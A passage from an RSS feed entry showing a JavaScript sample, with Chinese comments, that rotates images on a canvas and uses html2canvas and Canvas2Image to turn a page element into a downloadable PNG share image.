            step &lt; min_step &amp;&amp; (step = max_step);
        }

        //旋转角度以弧度值为参数    
        var degree = step * 90 * Math.PI / 180;
        var ctx = canvas.getContext('2d');
        switch (step) {
            case 0:
                canvas.width = width;
                canvas.height = height;
                ctx.drawImage(img, 0, 0);
                break;
            case 1:
                canvas.width = height;
                canvas.height = width;
                ctx.rotate(degree);
                ctx.drawImage(img, 0, -height);
                break;
            case 2:
                canvas.width = width;
                canvas.height = height;
                ctx.rotate(degree);
                ctx.drawImage(img, -width, -height);
                break;
            case 3:
                canvas.width = height;
                canvas.height = width;
                ctx.rotate(degree);
                ctx.drawImage(img, -width, 0);
                break;
        }
    };

    var html2Canvas = function (data) {

        var data = data;
        //获取像素密度
        var getPixelRatio = function (context) {
            var backingStore = context.backingStorePixelRatio ||
                context.webkitBackingStorePixelRatio ||
                context.mozBackingStorePixelRatio ||
                context.msBackingStorePixelRatio ||
                context.oBackingStorePixelRatio ||
                context.backingStorePixelRatio || 1;
            return (window.devicePixelRatio || 1) / backingStore;
        }
        //定义查找元素 方法
        var $s = function (selector) {
            return document.querySelector(selector);
        }
        var shareContent = $s("#shareContent"); // 需要绘制的部分的 (原生）dom 对象 ，注意容器的宽度不要使用百分比，使用固定宽度，避免缩放问题
        var width = shareContent.offsetWidth; // 获取(原生）dom 宽度
        var height = shareContent.offsetHeight; // 获取(原生）dom 高
        var offsetTop = shareContent.offsetTop; //元素距离顶部的偏移量
        var canvas = document.createElement('canvas'); //创建canvas 对象
        var context = canvas.getContext('2d');
        var scaleBy = getPixelRatio(context); //获取像素密度的方法 (也可以采用自定义缩放比例)
        //	    canvas.width = width * scaleBy;   //这里 由于绘制的dom 为固定宽度，居中，所以没有偏移
        canvas.width = (width + offsetTop) * scaleBy;
        canvas.height = (height + offsetTop) * scaleBy; // 注意高度问题，由于顶部有个距离所以要加上顶部的距离，解决图像高度偏移问题
        //	    canvas.height = height * scaleBy;
        context.scale(scaleBy, scaleBy);
        var opts = {
            allowTaint: true, //允许加载跨域的图片
            tainttest: true, //检测每张图片都已经加载完成
            scale: scaleBy, // 添加的scale 参数
            canvas: canvas, //自定义 canvas
            logging: false, //日志开关，发布的时候记得改成false
            width: width, //dom 原始宽度
            height: height, //dom 原始高度
        };
        console.log(2)
        html2canvas(shareContent, opts).then(function (canvas) {
            var hideCanvas = document.getElementById("shareQrCodeImg");
            hideCanvas.innerHTML = '';
            hideCanvas.appendChild(canvas);
            console.log(3112)
            var shareImgWidth = 640;
            var shareImgHeight = (shareImgWidth * canvas.height) / canvas.width;
            $(canvas).attr({
                "id": "mycanvas"
            });

            var oCanvas = document.getElementById("mycanvas");
            // 把画布保存成100x100的png格式,参数为false则是直接下载图片
            var oImg = Canvas2Image.saveAsPNG(canvas, true, shareImgWidth, shareImgHeight);
            console.log(2121, oImg)
            $("body").append(oImg)
        });
    }
&lt;/script&gt;

&lt;/html&gt;</code></pre>
<p>&nbsp;</p>
</p></div>
</div>
]]></content:encoded>
										</item>
	</channel>
</rss>
